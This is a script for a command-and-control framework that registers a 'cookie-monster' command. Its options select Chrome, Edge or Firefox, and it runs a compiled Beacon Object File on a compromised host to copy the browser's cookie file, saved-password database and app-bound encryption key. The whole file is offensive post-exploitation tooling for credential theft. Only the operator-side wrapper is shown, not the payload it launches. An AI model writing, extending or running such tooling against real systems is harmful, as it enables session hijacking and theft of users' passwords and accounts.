
var cmd_cookie_monster = ax.create_command("cookie-monster", "Locate and copy the cookie file used for Edge/Chrome/Firefox", "cookie-monster [ -b [chrome || msedge || firefox] [--cookie-only || --key-only || --password-only] [pid] ] or [--profile <Local State File Path> <PID>]");
cmd_cookie_monster.addArgFlagString( "-b", "browser",        "Extract data from 'chrome', 'msedge', 'firefox' or 'all'", "");
cmd_cookie_monster.addArgFlagString( "--profile", "profile", "Extract from custom browser profile path as system", "");
cmd_cookie_monster.addArgBool(       "--cookie-only",        "Only retrieve the Cookie file. Do not attempt to download Login Data file or retrieve app bound encryption key.");
cmd_cookie_monster.addArgBool(       "--password-only",      "Only retrieve the Login Data file. Do not attempt to download Cookie file or retrieve app bound encryption key.");
cmd_cookie_monster.addArgBool(       "--key-only",           "Only retrieve the app bound encryption key. Do not attempt to download the Cookie or Login Data files.");
cmd_cookie_monster.addArgInt(        "pid",                  "Browser PID", 0);
cmd_cookie_monster.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
{
    let browser = parsed_json["browser"];
    let profile = parsed_json["profile"];
    let pid     = parsed_json["pid"];

    let browserPid    = 0;
    let cookiePid     = 0;
    let passwordPid   = 0;
    let dumpCookie    = 0;
    let dumpPassword = 0;
    let dumpKey = 0;

    if(parsed_json["--key-only"]) {
        dumpKey = 1;
    }
    if(parsed_json["--cookie-only"]) {
        dumpCookie = 1;
        cookiePid = pid;
    }
    if(parsed_json["--password-only"]) {
        dumpPassword = 1;
        passwordPid = pid;
    }

    if(browser.length == 0 && profile.length == 0) { throw new Error("Use '-b <browser>' or '--profile <Local State path>'"); }

    if(browser.length > 0 && profile.length > 0) { throw new Error("'-b' cannot be used with '--profile'"); }

    if( profile.length > 0 ) {
        if( pid == 0 ) { throw new Error("For profile need browser PID"); }
        browserPid = pid;
    } else {
        if( browser != "chrome" && browser != "msedge" && browser != "firefox" && browser != "all") { throw new Error("Extract data from 'chrome', 'msedge', 'firefox' or 'all' only !"); }
    }
    if( browser == "all" ) browser = "";

    if( (dumpKey && dumpCookie) || (dumpKey && dumpPassword) || (dumpPassword && dumpCookie) ) { throw new Error("--key-only cannot be used with --cookie-only or --passwords-only"); }

    let bof_path = ax.script_dir() + "_bin/cookie-monster-bof." + ax.arch(id) + ".o";
    let bof_params = ax.bof_pack("cstr,cstr,int,int,int,int,int,int", [ browser, profile, browserPid, dumpCookie, dumpPassword, dumpKey, cookiePid, passwordPid]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Running Cookie-Monster BOF");
});
